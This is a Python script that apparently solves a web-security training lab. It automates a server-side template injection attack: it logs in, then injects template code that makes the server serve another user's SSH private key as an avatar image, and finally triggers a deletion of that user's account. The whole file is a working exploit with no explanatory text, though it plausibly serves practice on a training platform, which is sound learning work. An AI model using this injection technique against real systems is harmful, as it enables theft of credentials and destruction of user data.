import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
acc_url = burp_url + '/my-account'
post_1 = burp_url + '/post?postId=1'
post_comment = burp_url + '/post/comment'
trigger_ssti = burp_url + '/avatar?avatar=wiener'
create_payload = burp_url + '/my-account/change-blog-post-author-display'


session = requests.Session()
response = session.get(login_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)
burp_data = {"csrf": csrf,"username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)


response = session.get(post_1)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)
response = session.get(post_1)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)
files = {
    "csrf": (None, csrf),
    "postId": (None, "1"),
    "comment": (None, "111111"),
}
session.post(post_comment, files=files)
#print(r.text)

session.get(post_1)
session.get(trigger_ssti)


response = session.get(acc_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)
burp_data = {"blog-post-author-display": f"user.setAvatar('/home/carlos/.ssh/id_rsa','image/png')", "csrf": csrf}
session.post(create_payload, data=burp_data)
session.get(post_1)
session.get(trigger_ssti)


response = session.get(acc_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf_token = match.group(1)
burp_data = {"blog-post-author-display": f"user.gdprDelete()", "csrf": csrf}
session.post(create_payload, data=burp_data)
session.get(post_1)
session.get(trigger_ssti)
